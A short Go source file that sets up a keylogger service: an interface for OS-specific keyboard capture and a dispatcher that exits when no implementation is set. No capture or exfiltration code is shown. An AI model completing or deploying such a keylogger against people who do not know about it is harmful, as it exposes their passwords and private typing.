package keys

import (
	"bytes"
	"os"
)

type KeyLogger interface {
	CaptureKeyboardKeys(logBuffer *bytes.Buffer)
}

type KeyLoggerService struct {
	OS            string
	CurrentLogger KeyLogger
}

func NewKeyLoggerService(os string) *KeyLoggerService {
	return &KeyLoggerService{
		OS: os,
	}
}

func (s *KeyLoggerService) CaptureKeys(logBuffer *bytes.Buffer) {
	if s.CurrentLogger == nil {
		logBuffer.WriteString("OS not supported")
		os.Exit(1)
	}
	s.CurrentLogger.CaptureKeyboardKeys(logBuffer)
}
